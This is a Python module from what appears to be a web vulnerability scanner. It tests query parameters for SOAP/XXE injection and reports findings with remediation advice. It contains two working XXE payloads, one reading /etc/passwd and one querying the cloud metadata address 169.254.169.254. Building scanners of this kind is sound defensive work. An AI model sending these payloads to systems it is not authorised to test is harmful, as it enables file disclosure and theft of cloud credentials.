import copy
import re
import httpx
from modules.scanner.base_check import BaseCheck, CheckResult


class SoapInjectionCheck(BaseCheck):
    name = "active_soap_injection"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results = []
        payloads = [
            "<soap:Body><![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>]]></soap:Body>",
            "<soap:Body><![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>]><foo>&xxe;</foo>]]></soap:Body>",
        ]
        async with httpx.AsyncClient(verify=False, timeout=15, follow_redirects=False) as client:
            for param in target_params:
                for payload in payloads:
                    modified = self._inject_payload(base_request, param, payload)
                    try:
                        resp = await client.request(**modified)
                        indicators = ["root:", "ami-id", "meta-data", "instance-id"]
                        for indicator in indicators:
                            if indicator in resp.text:
                                results.append(CheckResult(
                                    triggered=True,
                                    severity="critical",
                                    title="SOAP injection detected",
                                    description=f"Parameter '{param}' processed SOAP XML with XXE payload.",
                                    evidence=f"Indicator: {indicator}\nResponse snippet: {resp.text[:200]}",
                                    remediation="Disable external entity processing in SOAP XML parsers. Validate SOAP messages with strict schema.",
                                    cwe="CWE-611",
                                ))
                                break
                    except Exception:
                        continue
        return results

    def _inject_payload(self, base: dict, param: str, payload: str) -> dict:
        import urllib.parse
        req = copy.deepcopy(base)
        parsed = urllib.parse.urlparse(req["url"])
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if param in params:
            params[param] = payload
            req["url"] = parsed._replace(query=urllib.parse.urlencode(params)).geturl()
        return req
